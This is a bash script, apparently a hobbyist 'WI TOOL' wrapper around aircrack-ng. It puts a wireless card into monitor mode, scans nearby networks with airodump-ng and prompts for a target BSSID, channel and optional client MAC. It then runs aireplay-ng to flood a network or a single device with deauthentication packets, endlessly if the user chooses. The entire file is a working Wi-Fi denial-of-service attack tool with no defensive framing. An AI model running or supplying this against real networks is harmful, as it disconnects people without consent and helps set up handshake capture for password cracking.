#!/bin/bash

clear

IFS=

R='\033[1;91m'
B='\033[1;34m'
G='\033[1;92m'
N='\033[1;37m'

echo
echo
echo -e  "${R} \t █     █░ ██▓   ▄▄▄█████▓ ▒█████   ▒█████   ██▓    "
echo -e  " \t▓█░ █ ░█░▓██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    "
echo -e  " \t▒█░ █ ░█ ▒██▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    "
echo -e  " \t░█░ █ ░█ ░██░   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    "
echo -e  " \t░░██▒██▓ ░██░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒"
echo -e  " \t░ ▓░▒ ▒  ░▓       ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░"
echo -e  " \t  ▒ ░ ░   ▒ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░"
echo -e  " \t  ░   ░   ▒ ░     ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   "
echo -e  " \t    ░     ░                  ░ ░      ░ ░      ░  ░"
echo -e  " \t                                                   ${N}"
echo
echo

sudo airmon-ng check kill

echo -n -e  "${G}Enter name of wifi interface (Enter for wlan0): ${N}"
read -n 1 scan
	if
		[ "$scan" = "" ]
	then
		echo
		echo -n -e "${G}Enter the duration in seconds to scan for nearby networks (Enter to select deafult 10s): ${N}"
		read -n 1 timer
	else
		read scan1
		echo
		echo -n -e "${G}Enter the duration in seconds to scan for nearby networks (Enter to select deafult 10s): ${N}"
		read -n 1 timer
fi

if
	[ "$timer" = "" ]
then
	echo
	echo
else
	read timer1
	echo
	echo
fi

	if
		[ "$timer" = "" ]
	then
		if
			[ "$scan" = "" ]
		then
			sudo airmon-ng start wlan0
			clear
			sudo timeout 10 airodump-ng wlan0
		else
			sudo airmon-ng start $scan$scan1
			clear
			sudo timeout 10 airodump-ng $scan$scan1
		fi
	else
		if
			[ "$scan" = "" ]
		then
			sudo airmon-ng start wlan0
			clear
			sudo timeout $timer$timer1 airodump-ng wlan0
		else
			sudo airmon-ng start $scan$scan1
			clear
			sudo timeout $timer$timer1 airodump-ng $scan$scan1
		fi
fi

echo -n -e  "${G}Enter BSSID of target: ${N}"
read bssid
echo
echo -n -e "${G}Enter channel which network is on: ${N}"
read channel
clear
echo -n -e  "${G}Enter name of wifi interface (Enter for wlan0): ${N}"
read -n 1 key

	if
		[ "$key" = "" ]
	then
		sudo airmon-ng start wlan0 $channel
		clear
	else
		read interface
		sudo airmon-ng start $key$interface $channel
		clear
fi

echo -n -e "${G}Enter name of wifi interface in${N} ${R}monitor mode${N}${G} (Enter for wlan0): ${N}"
read -n 1 key1

	if
		[ "$key1" = "" ]
	then
		echo
	else
		read interfacemon
		echo
fi
echo -n -e "${G}Enter number of dauthentication packets to send (Enter for endless deauthentication packets): ${N}"
read -n 1 key2

	if
		[ "$key2" = "" ]
	then
		echo
	else
		read packets
		echo
fi
clear
echo -n -e "${B}1) everyone\n2) Single target${N}"
echo
echo
echo -n -e "${G}Do you want to deauth everyone of the network or a single target: ${N}"
read -n 1 response

if
	[ "$response" = "1" ]
then

	if
		[ "$key1" = "" ]
	then
		if
			[ "$key2" = "" ]
		then
			clear
			echo
			sudo aireplay-ng -0 0 -a $bssid wlan0
		else
			clear
			echo
			sudo aireplay-ng -0 $key2$packets -a $bssid wlan0
		fi
	else
		if
			[ "$key2" = "" ]
		then
			clear
			echo
			sudo aireplay-ng -0 0 -a $bssid $key1$interfacemon
		else
			clear
			echo
			sudo aireplay-ng -0 $key2$packets -a $bssid $key1$interfacemon
		fi
	fi
fi

if
	[ "$response" = "2" ]
then
	echo
	echo
	echo -n -e "${G}enter station address (MAC) of target: ${N}"
	read station
		if
    	            [ "$key1" = "" ]
        then
                if
                        [ "$key2" = "" ]
                then
			clear
			echo
                        sudo aireplay-ng -0 0 -a $bssid -c $station wlan0
                else
			clear
			echo
                        sudo aireplay-ng -0 $key2$packets -a $bssid -c $station wlan0
                fi
        else
                if
                        [ "$key2" = "" ]
                then
			clear
			echo
                        sudo aireplay-ng -0 0 -a $bssid -c $station $key1$interfacemon
                else
			clear
			echo
                        sudo aireplay-ng -0 $key2$packets -a $bssid -c $station $key1$interfacemon
                fi
        fi
fi
